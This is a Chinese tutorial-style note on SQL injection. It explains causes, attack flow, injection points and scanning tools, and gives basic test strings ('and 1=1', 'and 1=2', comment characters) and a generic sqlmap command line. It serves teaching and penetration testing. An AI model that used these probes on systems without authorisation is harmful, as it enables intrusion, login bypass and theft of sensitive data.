SQL注入（SQL Injection）

定义（过程）

将SQL代码插入或添加到用户的输入参数中

利用现有应用程序的特性，攻击者通过在Web表单、URL等用户可输入数据的地方插入恶意SQL语句，一并原有的SQL语句被代库执行。

也就是说，SQL命令就是前端应用程序和后端数据库之间的接口。

静态网页：html或htm，不存在交互，不存在SQL注入漏洞。

伪静态网页：

形成原因

1.数据与代码未严格分离

2.用户提交的参数数据未做充分检查过滤即被代入到SQL命令中，从而改变原有SQL命令的语义，且被数据库成功执行。

常见过程

1.客户端（发送请求）：用户请求URL，但用户对其中的参数值等数据进行修改

2.服务端：未对用户数据进行检验检查，直接把用户输入的语句代入SQL命令中，即已改变SQL命令语义。此时服务端会发至数据库引擎。

3.数据库引擎：未对SQL语句进行判别，直接执行修改后的SQL命令。执行后返回给服务端。

4.服务端：将注入结果返回给客户端。

5.客户端：得知响应结果，并根据上一次注入获取的敏感信息继续构造注入语句，注入其他信息。

SQL injection参数

在渗透测试过程中的作用

如：

绕过登陆验证（使用万能密码登录网站后台）

获取敏感数据（比如网站管理员账号、密码等）

对文件系统进行操作（列出网站目录、读取敏感文件或写入文件）

注册表操作（读取、写入、删除注册表）

当权限比较大（系统管理员）便可以远程执行系统命令

出现位置

URL参数、HTTP包头（cookie、host参数等）、搜索框（登录框）、目录名、文件名等与数据库有交互关系的地方。当程序未对用户输入的数据进行有效的检查和过滤，直接代入SQL语句执行，此时便可能产生SQL注入漏洞。即最普遍的漏洞是由于参数值过滤不严导致的。

SQL注入漏洞寻找方式

1.使用工具：

优点：自动化、范围广、效率高；

缺点：误报、漏报，测试方法有限。

常用漏洞扫描工具：Safe3wvs、BurpSuite、Appscan、Acunetix WVS

2.手工测试

优点：测试方法灵活（写的时候已经固定）；

缺点：效率低、范围小，会因测试人员技术水平而异

SQL注入漏洞判断依据

根据客户端（页面）返回的结果来判断提交的测试语句是否被数据库引擎执行。如果测试语句被代库执行，说明存在注入漏洞。故需要先构造测试语句。

常见SQL测试语句

数字型：And 1 = 1

字符型：And ‘1’ = ‘1

注释字符

SQL Server和Oracle：

—用于单行注释

/ /用于多行注释

Mysql：

除了以上两个注释符号，还有#用于单行注释

实操过程

手工：

1.拿到URL判断是否存在SQL注入，如：”and 1=1、and 1=2”

2.若返回正常界面，则初步判断当前URL存在SQL注入

3.执行基本测试语句，如判断属于哪个数据库、数据库版本、当前使用的数据库等

工具：

SQLmap

命令：sqlmap.py -u “URL地址” -p 指定注入参数
